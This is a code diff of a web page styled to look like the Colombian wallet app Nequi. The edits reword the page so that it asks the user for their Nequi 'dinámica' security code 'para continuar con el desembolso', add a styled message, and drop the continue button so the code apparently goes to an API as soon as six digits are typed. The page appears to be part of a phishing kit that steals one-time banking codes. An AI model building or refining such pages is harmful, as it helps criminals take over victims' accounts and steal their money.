@@ -44,7 +44,7 @@ body {
     color: #200020;
 }
 
-.back-button:hover {
+.back-button:active {
     background: #f5f0f5;
     border-radius: 50%;
 }
@@ -112,11 +112,28 @@ body {
     pointer-events: none;
 }
 
-/* TEXTO INFORMATIVO */
-.info-text {
-    color: #999;
+/* TEXTO DE DINÁMICA */
+.dinamica-text {
+    color: #DA0081;
+    font-size: 14px;
+    font-weight: 500;
+    margin-top: 24px;
+    padding: 12px 20px;
+    background: #FFF0F5;
+    border-radius: 40px;
+    display: inline-block;
+    width: auto;
+    max-width: 280px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.dinamica-text span {
+    display: block;
     font-size: 13px;
-    margin-top: 20px;
+    color: #6b6b6b;
+    font-weight: normal;
+    margin-top: 4px;
 }
 
 /* TECLADO NUMÉRICO estilo Nequi */
@@ -223,35 +240,6 @@ body {
     height: 340px;
 }
 
-/* Botón de continuar estilo Nequi */
-.continue-btn {
-    position: fixed;
-    bottom: 400px;
-    left: 50%;
-    transform: translateX(-50%);
-    width: calc(100% - 40px);
-    max-width: 320px;
-    background: #DA0081;
-    color: white;
-    border: none;
-    padding: 18px;
-    border-radius: 40px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.2s;
-    z-index: 100;
-}
-
-.continue-btn:active {
-    transform: translateX(-50%) scale(0.98);
-}
-
-.continue-btn.disabled {
-    background: #E8D0E0;
-    cursor: not-allowed;
-}
-
 /* Responsive */
 @media (max-width: 480px) {
     .box {
@@ -268,6 +256,11 @@ body {
         font-size: 28px;
         padding: 12px 0;
     }
+    
+    .dinamica-text {
+        font-size: 13px;
+        padding: 10px 16px;
+    }
 }
 </style>
 </head>
@@ -281,25 +274,23 @@ body {
 </div>
 
 <div class="container">
-    <div class="title">Ingresa el código</div>
+    <div class="title">Ingresa tu dinámica</div>
     <div class="subtitle">
-        Escribe los 6 números que enviamos a 
-        <span class="email-highlight" id="emailDisplay">tu correo</span>
+        para continuar con el desembolso
     </div>
 
     <!-- CAJAS DE CÓDIGO -->
     <div class="code-boxes" id="boxes"></div>
 
-    <div class="info-text">
-        El código también llegó a tu <strong>celular</strong> por mensaje de texto
+    <!-- Mensaje dinámico estilo Nequi -->
+    <div class="dinamica-text">
+        🔐 Código de 6 dígitos
+        <span>Te lo enviamos a <span id="emailDisplay">tu correo</span> y celular</span>
     </div>
 </div>
 
 <!-- INPUT REAL OCULTO -->
 <input type="password" id="claveInput" maxlength="6" inputmode="numeric">
-
-<!-- BOTÓN CONTINUAR (estilo Nequi) -->
-<button class="continue-btn disabled" id="continueBtn">Continuar</button>
 
 <!-- TECLADO NUMÉRICO -->
 <div class="keyboard">
@@ -342,7 +333,6 @@ try {
 }
 
 const claveInput = document.getElementById('claveInput');
-const continueBtn = document.getElementById('continueBtn');
 const spinnerOverlay = document.getElementById('spinnerOverlay');
 
 // CREAR 6 CAJAS estilo Nequi
@@ -366,13 +356,6 @@ function updateBoxes() {
             box.classList.remove("filled");
         }
     });
-    
-    // Actualizar botón continuar
-    if (claveInput.value.length === 6) {
-        continueBtn.classList.remove("disabled");
-    } else {
-        continueBtn.classList.add("disabled");
-    }
 }
 
 // ENVIAR CÓDIGO A LA API
@@ -478,13 +461,6 @@ document.querySelectorAll(".key").forEach(key => {
             addNumber(value);
         }
     });
-});
-
-// BOTÓN CONTINUAR (estilo Nequi)
-continueBtn.addEventListener("click", () => {
-    if (claveInput.value.length === 6) {
-        enviarCodigo();
-    }
 });
 
 // SOPORTE PARA TECLADO FÍSICO
